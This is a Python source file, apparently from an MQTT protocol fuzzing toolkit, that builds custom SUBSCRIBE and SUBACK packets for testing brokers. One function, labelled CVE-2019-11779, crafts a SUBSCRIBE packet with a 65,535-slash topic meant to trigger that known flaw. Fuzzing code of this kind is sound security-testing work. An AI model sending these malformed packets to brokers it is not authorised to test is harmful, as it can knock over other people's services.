# Copyright (C) OTARIS INTERACTIVE SERVICES GmbH
# Author: Kathrin Kleinhammer <kleinhammer@otaris.de>
# This program is published under GPLv2 license

from mqtt import MQTT, MQTTSubscribe, MQTTSuback, MQTTPubSubStatusProperty, MQTTTopic, MQTTTopicQOS, MQTTSubscribeProperty

class Fuzz_Subscribe:

    #CVE-2019-11779
    def fuzz_topic(self):
        pkt = MQTT()/MQTTSubscribe(topics=MQTTTopic(topic=b"/"*65535))
        pkt.QOS = 1
        return pkt

    def fuzz_suback(self, msgid=0, reason_string=None, user_property={"key":None, "value":None}, retcode=0):
        "generate custom SUBACK packet"
        pkt = MQTT()/MQTTSuback()
        pkt.msgid = msgid
        if reason_string is not None:
            pkt.properties.append(MQTTPubSubStatusProperty(type=0x1F, reason_string=reason_string))
        if "key" in user_property and "value" in user_property and user_property['key'] is not None and user_property['value'] is not None:
            pkt.properties.append(MQTTPubSubStatusProperty(type=0x26, key=user_property['key'], value=user_property['value']))
        pkt.retcode = retcode
        return pkt

    def fuzz_subscribe(self, msgid=0, topics=None, user_property={"key":None, "value":None}, qos=0, pkt=None):
        "generate custom SUBSCRIBE packet"
        if topics is not None:
            pkt = MQTT()/MQTTSubscribe(topics=[MQTTTopicQOS(topic=topics.encode())])
        else:
            pkt = MQTT()/MQTTSubscribe()
        pkt.msgid = msgid
        pkt.QOS = qos
        if "key" in user_property and "value" in user_property and user_property['key'] is not None and user_property['value'] is not None:
            pkt.properties.append(MQTTSubscribeProperty(type=0x26, key=user_property['key'], value=user_property['value']))
        return pkt
